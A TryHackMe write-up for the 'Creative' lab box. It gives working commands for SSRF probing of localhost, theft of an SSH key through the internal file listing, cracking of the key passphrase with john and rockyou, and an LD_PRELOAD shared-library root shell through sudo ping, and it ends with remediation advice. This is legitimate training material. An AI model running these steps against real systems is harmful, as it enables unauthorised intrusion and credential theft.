# Creative — TryHackMe Writeup

> **Room:** [Creative](https://tryhackme.com/room/creative) · **Difficulty:** Easy–Medium
> **Category:** Web / Boot2Root (SSRF → LD_PRELOAD)
> **Author of writeup:** 0xnyx
> **Goal:** Exploit a vulnerable web app and some misconfigurations to gain root.

> ⚠️ In line with TryHackMe's write-up policy, **no flags, passwords, or cracked values are included** — only the method, so you can reproduce every step yourself.

---

## How to read this writeup

Each step is **Do** (the command/action) → **You get** (what comes back) → **Why / what next** (what it means and where it leads). The whole box is a chain: SSRF → internal file read → SSH key crack → cred leak → LD_PRELOAD root.

---

## Step 1 — Port scan

**Do** — Version scan. `-Pn` skips ping (THM blocks it).

```bash
nmap -sVC -T4 -Pn <TARGET>
```

**You get**

```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp open  http  nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
```

**Why / what next** — Only SSH + HTTP. The redirect to `creative.thm` means the site uses **virtual hosts** — so there may be more vhosts (like a `beta.` subdomain). Add them to your hosts file so your browser/curl resolve them.

```bash
echo "<TARGET> creative.thm beta.creative.thm" | sudo tee -a /etc/hosts
```

---

## Step 2 — Find the SSRF

**Do** — Browse both vhosts. `creative.thm` is a static landing page; check `beta.creative.thm` for anything interactive.

```bash
curl -s http://beta.creative.thm/ | grep -iE '<form|<input|action|name='
```

**You get**

```html
<form action="/" method="POST">
  <input type="text" id="url" name="url" placeholder="http://example.com">
  <input type="submit" value="Submit">
```

**Why / what next** — `beta.creative.thm` is a **URL tester**: you give it a URL, the server fetches it and shows the result. A server that fetches arbitrary URLs for you is a textbook **SSRF (Server-Side Request Forgery)** — we can make it request internal services that aren't exposed to us.

---

## Step 3 — SSRF → discover an internal service

**Do** — Point the `url` parameter at the server's own loopback address to reach services bound to localhost. Probe likely internal ports (a quick ffuf sweep finds them fast):

```bash
# quick manual check
curl -s -X POST http://beta.creative.thm/ -d "url=http://127.0.0.1:1337" | sed 's/<[^>]*>//g' | grep -vE '^\s*$'

# or sweep ports via SSRF:
# ffuf -w ports.txt -u http://beta.creative.thm/ -X POST -d "url=http://127.0.0.1:FUZZ" -fw <baseline-words>
```

**You get**

```
Directory listing for /
bin@  boot/  dev/  etc/  home/  ...  root/  ...
```

**Why / what next** — Port **1337** runs a **directory-listing service** (a Python `http.server`-style listing) rooted at `/` — the entire filesystem. It's only bound to localhost, but through the SSRF we can read any file on the box. The obvious prize is an SSH private key.

---

## Step 4 — Read the SSH private key via SSRF

**Do** — First list `/home` to find usernames, then read the target user's key.

```bash
curl -s -X POST http://beta.creative.thm/ -d "url=http://127.0.0.1:1337/home/" | sed 's/<[^>]*>//g'
# -> saad/  ubuntu/

curl -s -X POST http://beta.creative.thm/ -d "url=http://127.0.0.1:1337/home/saad/.ssh/id_rsa" \
  | sed 's/<[^>]*>//g' | sed -n '/BEGIN OPENSSH/,/END OPENSSH/p' > id_rsa
chmod 600 id_rsa
```

**You get** — `saad`'s `id_rsa`. The header (`aes256-ctr` / `bcrypt`) shows it's **passphrase-encrypted**, so you can't use it as-is.

**Why / what next** — An encrypted key just means we crack the passphrase offline.

---

## Step 5 — Crack the key passphrase

**Do** — Convert the key to a John-compatible hash and run rockyou.

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
john id_rsa.hash --show
```

**You get** — The passphrase (a common rockyou word).

**Why / what next** — With the key + passphrase we can log in as `saad` over SSH — a stable shell, and the user flag.

```bash
ssh -i id_rsa saad@creative.thm      # enter the cracked passphrase
cat ~/user.txt                       # <USER FLAG>
```

---

## Step 6 — Credential leak (.bash_history)

**Do** — After any shell, read the shell history — people leave secrets there.

```bash
cat ~/.bash_history
```

**You get** — Among the commands, a line that echoes `saad`'s **password** into a file (then deletes it), plus a `sudo -l` that worked (`.sudo_as_admin_successful` is present).

**Why / what next** — Now we have `saad`'s sudo password, which we need to check our sudo rights.

---

## Step 7 — Privilege escalation (LD_PRELOAD)

**Do** — Check what `saad` can run as root.

```bash
sudo -l
```

**You get**

```
env_keep+=LD_PRELOAD
User saad may run the following commands:
    (root) /usr/bin/ping
```

**Why / what next** — Two misconfigs combine into instant root: `saad` can run `ping` as root, **and** sudo keeps the `LD_PRELOAD` environment variable (`env_keep+=LD_PRELOAD`). `LD_PRELOAD` forces the dynamic linker to load our shared library **before** anything else — and since `ping` runs as root, our library's constructor runs as root.

**Do** — Build a tiny shared library whose constructor drops a root shell, then run `ping` with it preloaded:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
```

**You get**

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt     -> <ROOT FLAG>
```

**Why / what next** — Root shell, final flag. Box fully owned. 🏁

---

## The full chain at a glance

| Step | Technique | Result |
|------|-----------|--------|
| 1 | nmap + vhost discovery | Found `beta.creative.thm` |
| 2 | URL-tester form | SSRF entry point (`url` param) |
| 3 | SSRF → 127.0.0.1:1337 | Internal directory-listing of `/` |
| 4 | SSRF file read | `saad`'s encrypted `id_rsa` |
| 5 | ssh2john + rockyou | Key passphrase → SSH as saad (user flag) |
| 6 | `.bash_history` | saad's sudo password |
| 7 | `sudo ping` + `LD_PRELOAD` | root flag |

## Lessons

- A server that fetches a URL for you = **SSRF** → reach `127.0.0.1`/internal ports the firewall hides.
- SSRF port-sweep with ffuf (`url=http://127.0.0.1:FUZZ`, filter the baseline response) finds internal services fast.
- An **encrypted SSH key** is still game over — `ssh2john` + rockyou cracks weak passphrases.
- Always read `.bash_history` for leaked credentials.
- **`env_keep+=LD_PRELOAD`** on any sudo-allowed binary = instant root via a malicious `.so` constructor.

## Remediation

- Never let a URL-fetch feature reach internal addresses; allow-list destinations and block `127.0.0.1`/link-local.
- Don't expose a filesystem directory listing, even on localhost.
- Store SSH keys with strong passphrases; rotate any key that leaks.
- Clear shell history of secrets; use a secrets manager.
- Remove `env_keep+=LD_PRELOAD` from sudoers and avoid `NOPASSWD`/root-allowed binaries with escape vectors.

---

*Write-up for [TryHackMe — Creative](https://tryhackme.com/room/creative).*
